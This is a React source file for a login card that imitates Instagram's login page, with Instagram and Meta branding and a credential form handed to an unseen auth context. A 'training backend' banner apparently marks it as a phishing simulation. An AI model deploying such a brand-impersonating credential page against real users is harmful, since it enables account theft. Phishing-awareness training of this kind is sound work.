import React, { useState } from 'react';
import { Loader2 } from 'lucide-react';
import { FacebookLogo } from '../icons/FacebookLogo';
import { MetaLogo } from '../icons/MetaLogo';
import { CreateAccountModal } from './CreateAccountModal';
import { ForgotPasswordModal } from './ForgotPasswordModal';
import { useAuth } from '../../context/AuthContext';

export const AuthCard: React.FC = () => {
  const { login, loginWithFacebook, isLoading, lastSubmitMessage, backendAvailable } =
    useAuth();
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [isForgotOpen, setIsForgotOpen] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const isFormValid = identifier.trim().length > 0 && password.trim().length > 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setErrorMessage(null);

    try {
      const ok = await login(identifier, password);
      if (!ok) {
        setErrorMessage(
          lastSubmitMessage ||
            'Sorry, your password was incorrect. Please double-check your password.'
        );
      }
    } catch {
      setErrorMessage(
        'Sorry, your password was incorrect. Please double-check your password.'
      );
    }
  };

  const handleFacebookLogin = async () => {
    if (isLoading) return;
    await loginWithFacebook();
  };

  const displayError = errorMessage || lastSubmitMessage;

  return (
    <>
      <div className="w-full max-w-[360px] mx-auto flex flex-col justify-between h-full py-4 sm:py-8 select-none">
        <div className="my-auto w-full">
          {/* Header */}
          <h2 className="text-[20px] font-semibold text-white tracking-tight mb-2">
            Log in to Instagram
          </h2>

          {backendAvailable === false && (
            <div className="mb-4 p-3 rounded-lg bg-amber-950/80 border border-amber-500/50 text-amber-100 text-xs">
              Training backend is currently unavailable. Please try again shortly.
            </div>
          )}

          {displayError && (
            <div className="mb-4 p-3 rounded-lg bg-red-950/70 border border-red-500/40 text-red-200 text-xs">
              {displayError}
            </div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-2.5">
            {/* Input 1: Identifier */}
            <div className="relative">
              <input
                type="text"
                autoComplete="username"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                placeholder="Mobile number, username or email address"
                className="w-full h-11 px-3.5 rounded-xl bg-[#121212] border border-[#363636] text-sm text-white placeholder-[#737373] focus:border-[#737373] focus:outline-none transition-colors"
                required
                disabled={isLoading}
              />
            </div>

            {/* Input 2: Password */}
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full h-11 px-3.5 pr-16 rounded-xl bg-[#121212] border border-[#363636] text-sm text-white placeholder-[#737373] focus:border-[#737373] focus:outline-none transition-colors"
                required
                disabled={isLoading}
              />
              <button
                type="button"
                tabIndex={-1}
                onClick={() => setShowPassword((v) => !v)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[13px] font-semibold text-white/80 hover:text-white"
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>

            {/* Submit */}
            <button
              type="submit"
              disabled={!isFormValid || isLoading}
              className={`w-full h-11 mt-1 rounded-xl text-sm font-semibold flex items-center justify-center gap-2 transition-all ${
                isFormValid && !isLoading
                  ? 'bg-[#0064e0] hover:bg-[#1877f2] active:scale-[0.99] text-white cursor-pointer shadow-[0_2px_8px_rgba(0,100,224,0.35)]'
                  : 'bg-[#004b99]/70 text-white/60 cursor-not-allowed'
              }`}
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin text-white" />
                  <span>Logging in...</span>
                </>
              ) : (
                <span>Log in</span>
              )}
            </button>
          </form>

          {/* Forgotten Password Link */}
          <div className="text-center mt-4">
            <button
              type="button"
              onClick={() => setIsForgotOpen(true)}
              className="text-[13px] text-[#e0e0e0] hover:underline cursor-pointer transition-colors"
            >
              Forgotten password?
            </button>
          </div>

          {/* Secondary Actions */}
          <div className="mt-14 space-y-3">
            <button
              type="button"
              onClick={handleFacebookLogin}
              disabled={isLoading}
              className="w-full h-11 rounded-xl bg-[#262626] hover:bg-[#303030] active:bg-[#202020] text-white text-sm font-semibold flex items-center justify-center gap-2.5 transition-colors cursor-pointer"
            >
              <FacebookLogo size={19} />
              <span>Log in with Facebook</span>
            </button>

            <button
              type="button"
              onClick={() => setIsCreateOpen(true)}
              className="w-full h-11 rounded-xl border border-[#0064e0] hover:bg-[#0064e0]/10 active:bg-[#0064e0]/20 text-[#0095f6] text-sm font-semibold flex items-center justify-center transition-colors cursor-pointer"
            >
              <span>Create new account</span>
            </button>
          </div>
        </div>

        <div className="mt-10 flex justify-center items-center pb-2">
          <MetaLogo size={18} textColor="#737373" />
        </div>
      </div>

      <CreateAccountModal
        isOpen={isCreateOpen}
        onClose={() => setIsCreateOpen(false)}
      />
      <ForgotPasswordModal
        isOpen={isForgotOpen}
        onClose={() => setIsForgotOpen(false)}
      />
    </>
  );
};
